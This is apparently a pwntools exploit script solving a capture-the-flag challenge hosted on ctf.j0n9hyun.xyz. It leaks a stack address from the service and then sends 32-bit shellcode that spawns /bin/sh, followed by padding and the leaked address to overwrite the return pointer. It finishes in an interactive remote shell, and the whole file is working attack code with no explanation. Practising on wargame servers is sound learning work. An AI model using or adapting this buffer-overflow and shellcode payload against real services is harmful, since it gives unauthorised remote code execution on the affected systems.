from pwn import *

r = remote("ctf.j0n9hyun.xyz", 3006)

r.recvuntil("Data : ")
r.sendline("hi")
addr = int(r.recv(10), 16)
r.recvuntil("Again (y/n)")
r.sendline("y")
r.recvuntil("Data : ")

payload = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
payload += b"A"*115
payload += p32(addr)

r.sendline(payload)
r.interactive()